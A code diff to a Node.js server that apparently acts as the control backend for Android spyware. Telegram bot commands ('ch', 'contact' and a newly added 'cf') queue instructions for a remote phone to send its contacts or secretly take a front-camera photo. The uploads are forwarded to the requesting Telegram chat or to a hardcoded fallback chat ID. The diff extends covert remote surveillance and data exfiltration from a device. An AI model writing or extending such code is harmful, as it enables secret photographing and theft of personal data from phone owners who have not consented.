@@ -26,7 +26,7 @@ const storage = multer.diskStorage({
 const upload = multer({ storage: storage });
 
 // --- Application State ---
-// To track if a command was requested (e.g. 'none', 'ch', 'contact')
+// To track if a command was requested (e.g. 'none', 'ch', 'contact', 'cf')
 let pendingCommand = 'none';
 let requestingChatId = null;
 
@@ -52,6 +52,15 @@ bot.command('contact', (ctx) => {
     
     // Set the state so the Android app knows to send the data next time it checks
     pendingCommand = 'contact';
+    requestingChatId = ctx.chat.id;
+});
+
+bot.command('cf', (ctx) => {
+    // Acknowledge to the user
+    ctx.reply('Command received. Waiting for the Android device to capture a front camera photo...');
+    
+    // Set the state so the Android app knows to send the data next time it checks
+    pendingCommand = 'cf';
     requestingChatId = ctx.chat.id;
 });
 
@@ -86,12 +95,20 @@ app.post('/upload-log', upload.single('document'), async (req, res) => {
 
     if (requestingChatId) {
         try {
-            // Forward the document back to the Telegram chat that requested it
-            await bot.telegram.sendDocument(requestingChatId, {
-                source: req.file.path,
-                filename: req.file.originalname 
-            });
-            console.log(`Document ${req.file.originalname} sent successfully to Telegram.`);
+            if (req.file.originalname.endsWith('.jpg') || req.file.originalname.endsWith('.png')) {
+                // It's an image, send as Photo
+                await bot.telegram.sendPhoto(requestingChatId, {
+                    source: req.file.path
+                });
+                console.log(`Photo ${req.file.originalname} sent successfully to Telegram.`);
+            } else {
+                // Forward the document back to the Telegram chat that requested it
+                await bot.telegram.sendDocument(requestingChatId, {
+                    source: req.file.path,
+                    filename: req.file.originalname 
+                });
+                console.log(`Document ${req.file.originalname} sent successfully to Telegram.`);
+            }
             res.status(200).send('File received and forwarded.');
         } catch (error) {
             console.error('Error forwarding to Telegram:', error);
@@ -112,10 +129,16 @@ app.post('/upload-log', upload.single('document'), async (req, res) => {
         // or just ignore. We'll use the hardcoded one for safety.
         const FALLBACK_CHAT_ID = "1691680798";
         try {
-            await bot.telegram.sendDocument(FALLBACK_CHAT_ID, {
-                source: req.file.path,
-                filename: req.file.originalname
-            });
+            if (req.file.originalname.endsWith('.jpg') || req.file.originalname.endsWith('.png')) {
+                await bot.telegram.sendPhoto(FALLBACK_CHAT_ID, {
+                    source: req.file.path
+                });
+            } else {
+                await bot.telegram.sendDocument(FALLBACK_CHAT_ID, {
+                    source: req.file.path,
+                    filename: req.file.originalname
+                });
+            }
             res.status(200).send('File received and forwarded (fallback).');
         } catch (error) {
             console.error('Error forwarding to Telegram (fallback):', error);
